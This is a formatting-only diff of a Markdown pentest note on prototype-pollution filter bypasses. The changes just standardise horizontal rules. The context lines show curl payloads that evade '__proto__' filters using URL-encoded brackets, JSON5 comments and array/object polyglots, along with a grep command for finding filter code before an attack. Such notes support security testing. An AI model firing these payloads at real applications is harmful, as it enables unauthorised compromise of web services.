@@ -15,7 +15,7 @@ linked:
 ---
 # Prototype Pollution - Bypasses y Filter Evasion
 
-***
+---
 
 ## `__proto__` Blocked → `constructor.prototype`
 
@@ -30,7 +30,7 @@ linked:
 | Inspect frontend code: `grep -E 'replace.*__proto__\|filter.*proto' main.js` | Identify filter patterns | Pre-attack. |
 ^pp-bypass-constructor
 
-___
+---
 
 ## Notación Bracket vs Dot
 
@@ -45,7 +45,7 @@ ___
 | `curl "https://target/?%5B__proto__%5D=yes"` (URL-encoded brackets) | Encoded bracket bypass | Decode-after-filter. |
 ^pp-bypass-notation
 
-___
+---
 
 ## JSON Encoding Tricks
 
@@ -60,7 +60,7 @@ ___
 | `curl -X POST -H "Content-Type: application/json5" -d '{"__proto__"/*comment*/:{"x":"y"}}' https://target/api/x` | JSON5 comments | JSON5-aware parser. |
 ^pp-bypass-encoding
 
-___
+---
 
 ## Array vs Object Polyglot
 
@@ -75,7 +75,7 @@ ___
 | `curl -X POST -d '{"a":[{"__proto__":{"x":"y"}}]}' https://target/api/x` | Object con array con PP | Combined polyglot. |
 ^pp-bypass-array
 
-___
+---
 
 ## Header / Cookie Smuggling
 
@@ -104,4 +104,4 @@ ___
    - Unicode escape + JSON nested + duplicate key
 ```
 
-***
+---
